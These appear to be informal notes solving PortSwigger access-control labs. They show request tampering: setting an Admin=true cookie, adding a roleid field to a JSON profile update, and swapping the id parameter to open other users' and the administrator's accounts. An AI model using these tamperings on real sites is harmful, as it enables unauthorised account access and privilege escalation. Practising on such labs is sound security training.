Url: https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter
use BurpSuite
```
Cookie: Admin=true; session=fqp8yYIRTldGT5v9M2wvHvMALbkDz6kP
Observe that the response sets the cookie Admin=false. Change it to Admin=true.
```
Url: https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile
Send the email submission request to Burp Repeater, add "roleid":2 into the JSON in the request body, and resend it.
Observe that the response shows your roleid has changed to 2. 
```
{"email":"test@gmail.com" }
convert to
{"email":"test@gmail.com",
"roleid":2}
 or
"roleid:1,2,3,4" like that
```
urs:https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter
```
GET /my-account?id=wiener
```
change ID parameter as carlos
```
GET /my-account?id=carlos
```
url:https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids
Find a blog post by carlos.
Click on carlos and observe that the URL contains his
```
GET /my-account?id=98ec5ea0-b562-4211-a146-7a44ba6c2770
GET /blogs?userId=80bd0023-fd27-4afd-b42a-161256c48970
```
uid and id parameter converts as login another users, both id and userid is ApiKey
```
GET /my-account?id=80bd0023-fd27-4afd-b42a-161256c48970
```
url: https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect
Redirect user like carlos, administrator, wiener
```
GET /my-account?id=
GET /my-account?id=carlos
GET /my-account?id=wiener
GET /my-account?id=administrator
```


